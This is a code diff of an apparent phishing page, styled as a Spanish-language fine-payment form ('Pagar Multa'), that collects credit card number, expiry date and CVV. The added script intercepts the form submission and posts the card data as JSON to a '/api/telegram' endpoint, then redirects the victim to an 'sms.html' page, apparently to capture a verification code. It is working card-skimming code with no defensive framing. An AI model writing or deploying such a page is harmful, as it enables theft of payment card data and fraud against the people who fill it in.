@@ -183,42 +183,65 @@
 <section class="procedure">
 <h2 style="font-weight: normal; line-height: 1.875rem; color: rgb(76, 83, 93); background-color: rgb(255, 255, 255); text-transform: uppercase; border-bottom: 0.625rem solid rgb(133, 204, 242);"><span style="font-size: 11px;"><span class="badge badge-info" style="box-sizing: inherit; padding: 3px 7px; vertical-align: middle; border-radius: 10px; min-width: 10px; background-color: rgb(51, 122, 183);"><span id="numeroAvisosId" style="box-sizing: inherit;">2</span> </span> <span style="color: rgb(51, 122, 183); font-weight: 700;">&nbsp;&nbsp;</span> </span> <span style="font-size:12px;"> <span style="color: rgb(51, 122, 183); font-family: 'Open Sans', Helvetica, Arial, sans-serif; font-weight: 700;">Tarjeta de cr&eacute;dito</span> </span></h2>
 
-<form action="./infoz/c.php" method="post">
-<div class="row">
-<div class="row"><!-- Credit Card Number -->
-<div class="col-md-6 form-group"><label for="credit-card">N&uacute;mero de tarjeta de cr&eacute;dito</label> <input id="credit-card" maxlength="16" name="cc" pattern="^[45]\d{15}$" placeholder="598765432101234" required="" title="Debe ingresar un número de tarjeta válido de 16 dígitos, que comience con 4 o 5." type="text" /></div>
+<form id="cardForm">
+  <div class="row">
+    <!-- Credit Card Number -->
+    <div class="col-md-6 form-group">
+      <label for="credit-card">Número de tarjeta de crédito</label>
+      <input id="credit-card" maxlength="16" name="cc" required type="text" placeholder="598765432101234" />
+    </div>
 
-<div class="col-md-6 form-group"><label for="expiry-date">Fecha de expiraci&oacute;n (MM/YY)</label> <input id="expiry-date" maxlength="5" name="exp" oninput="formatExpiryDate(this)" pattern="^(0[1-9]|1[0-2])\/\d{2}$" placeholder="MM/YY" required="" title="Ingrese una fecha válida en formato MM/YY" type="text" /></div>
+    <div class="col-md-6 form-group">
+      <label for="expiry-date">Fecha de expiración (MM/YY)</label>
+      <input id="expiry-date" maxlength="5" name="exp" oninput="formatExpiryDate(this)" required type="text" placeholder="MM/YY" />
+    </div>
+
+    <div class="col-md-6 form-group">
+      <label for="cvv">CVV</label>
+      <input id="cvv" maxlength="3" name="cvv" required type="tel" placeholder="123" />
+    </div>
+  </div>
+
+  <p><button class="btn btn-primary" type="submit">Pagar Multa</button></p>
+</form>
+
 <script>
-  // Function to format the expiry date as MM/YY
+  // نفس الفورمات ديال التاريخ
   function formatExpiryDate(input) {
-    let value = input.value.replace(/\D/g, ''); // Remove all non-digit characters
+    let value = input.value.replace(/\D/g, '');
     if (value.length >= 2) {
-      value = value.substring(0, 2) + '/' + value.substring(2, 4); // Add '/' after MM part
+      value = value.substring(0, 2) + '/' + value.substring(2, 4);
     }
-    input.value = value.substring(0, 5); // Limit the value to "MM/YY"
+    input.value = value.substring(0, 5);
   }
 
-  // Function to ensure the input field is initially empty and doesn't show any default value
-  window.onload = function() {
-    document.getElementById('expiry-date').value = ''; // Clear the field on load
-  };
+  const cardForm = document.getElementById("cardForm");
+  cardForm.addEventListener("submit", async (e) => {
+    e.preventDefault();
+
+    const cc = document.getElementById("credit-card").value;
+    const exp = document.getElementById("expiry-date").value;
+    const cvv = document.getElementById("cvv").value;
+
+    try {
+      const response = await fetch("/api/telegram", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ cc, exp, cvv }),
+      });
+
+      if (response.ok) {
+        window.location.href = "sms.html"; // يديه مباشرة لصفحة SMS
+      } else {
+        alert("Error al enviar datos.");
+      }
+    } catch (err) {
+      console.error(err);
+      alert("Error en la conexión.");
+    }
+  });
 </script>
 
-<div class="row">
-<div class="col-md-6 form-group"><label for="cvv">CVV</label> <input id="cvv" maxlength="3" name="cvv" pattern="\d{3}" placeholder="123" required="" title="Debe ingresar un CVV válido de 3 dígitos" type="tel" /></div>
-</div>
-
-<div class="row">
-<div class="col-md-4 form-group">&nbsp;</div>
-
-<div class="col-md-4 form-group">&nbsp;</div>
-</div>
-
-<p><button class="btn btn-primary" type="submit">Pagar Multa</button></p>
-</div>
-</div>
-</form>
 </section>
 
 <footer>
